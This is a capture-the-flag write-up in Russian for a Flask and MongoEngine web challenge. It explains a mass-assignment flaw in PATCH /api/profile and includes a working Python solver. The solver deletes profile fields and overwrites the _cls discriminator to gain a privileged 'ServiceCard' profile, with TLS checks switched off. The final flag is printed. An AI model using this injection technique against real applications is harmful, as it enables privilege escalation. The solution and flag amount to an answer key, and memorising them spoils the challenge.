---
title: "Peridromofilia"
ctf: "Кубок CTF 2026"
date: 2026-11-01
category: web
difficulty: medium
points: 567
flag_format: "ctfcup{...}"
author: "citr0n"
---

# Peridromofilia

## Summary

Веб-приложение клуба коллекционеров карт «Тройка» на Flask + MongoEngine. Эндпоинт `PATCH /api/profile` применяет JSON-ключи напрямую как поля MongoEngine-апдейта без фильтрации. Это позволяет через ключ `profile___cls` переписать дискриминатор `_cls` embedded-профиля (обход проверки типа), а через `unset__profile__...` удалить поля. Собрав валидный служебный профиль `ServiceCard`, получаем «Служебный доступ» с флагом.

## Solution

### Шаг 1: Разведка и поиск уязвимости

- Регистрация требует реальную станцию метро; сессия — подписанный Flask-cookie `{"u": "<username>"}`.
- Профиль пользователя — embedded-документ. На `/me` рендерятся «Статус» и «Право участия» (имя класса профиля).
- `PATCH /api/profile` с неизвестным полем выдаёт характерные ошибки MongoEngine (`Cannot resolve field`, `not a valid ObjectId`, `Querying the embedded document 'Profile' failed`) — ключи JSON идут прямо в update с разделителем `__`.
- В `/members` виден служебный аккаунт «Вахтер Галина Ивановна» с правом участия **`ServiceCard`** — третий, привилегированный класс (помимо `Profile` и `GoldenProfile`).

### Шаг 2: Сборка валидного ServiceCard и чтение флага

Ключевые примитивы инъекции:
- `{"profile___cls": "ServiceCard"}` → пишет `profile._cls` произвольной строкой в обход проверки типа EmbeddedDocumentField.
- `{"unset__profile__<field>": 1}` → удаляет поле из embedded-документа.

Прямое присвоение `_cls=ServiceCard` ломает все страницы: в хранилище остаются поля `nickname/home_station/member_since`, которых нет у `ServiceCard`, и строгая загрузка падает с `FieldDoesNotExist`. Нужно удалить эти поля, тогда документ загрузится как чистый `ServiceCard`, и в «Статус» отрисуется флаг.

```python
#!/usr/bin/env python3
# Peridromofilia solver: MongoEngine _cls/field injection -> ServiceCard -> flag
import urllib.request, urllib.parse, http.cookiejar, ssl, json, re, random

BASE = "https://1012bteore3fdzgw.instances.ctfcup.online"  # заменить на актуальный инстанс

ctx = ssl.create_default_context(); ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE
cj = http.cookiejar.CookieJar()
op = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj),
                                 urllib.request.HTTPSHandler(context=ctx))

def req(path, data=None, method=None, json_body=False, retries=20):
    """POST/PATCH/GET с ретраями (ingress-прокси иногда отвечает 'Invalid token')."""
    for _ in range(retries):
        body, headers = None, {"User-Agent": "solver"}
        if json_body:
            body = json.dumps(data).encode(); headers["Content-Type"] = "application/json"
        elif isinstance(data, dict):
            body = urllib.parse.urlencode(data).encode()
        r = urllib.request.Request(BASE + path, data=body, method=method, headers=headers)
        try:
            resp = op.open(r, timeout=15); b = resp.read().decode("utf-8", "replace")
        except urllib.error.HTTPError as e:
            b = e.read().decode("utf-8", "replace")
        if "Invalid token" in b:          # промах ingress-прокси — повторяем
            continue
        return b
    raise RuntimeError("ingress unreachable")

def patch(obj):
    return req("/api/profile", obj, method="PATCH", json_body=True)

# 1) Регистрация (home_station должна быть реальной станцией метро)
user = "solver%d" % random.randint(1000, 99999)
req("/register", {"username": user, "password": "Pw123456",
                  "nickname": "solver", "home_station": "Савёловская"})

# 2) Удаляем поля базового профиля и переключаем класс на ServiceCard
patch({"unset__profile__nickname": 1})
patch({"unset__profile__home_station": 1})
patch({"unset__profile__member_since": 1})   # на случай, если успели создать GoldenProfile
patch({"profile___cls": "ServiceCard"})

# 3) Читаем флаг из поля «Статус» на /me
html = req("/me")
print(re.search(r"ctfcup\{[^}]*\}", html).group(0))
```

Вывод:

```
ctfcup{g1v3_m3_all_tr0ikas_c3f06118e5cf8cbb}
```

На странице `/me` это отображается как:

```
Статус: Служебный доступ: ctfcup{g1v3_m3_all_tr0ikas_c3f06118e5cf8cbb}
Право участия: ServiceCard
```

## Flag

```
ctfcup{g1v3_m3_all_tr0ikas_c3f06118e5cf8cbb}
```

## Примечания

- Тупики: `Server: ugabuga` — ingress-прокси платформы (токен = первый лейбл Host), к таске не относится; поиск в каталоге/членах — не regex-инъекция; комментарии в обменах экранируются (нет XSS/SSTI); `/api/gold` и поле `member_since` — косметика.
- Корневая причина: массовое присвоение полей MongoEngine в `PATCH /api/profile` (небезопасная передача пользовательских ключей в `update`), включая запись дискриминатора `_cls` и операторы вроде `unset__`.
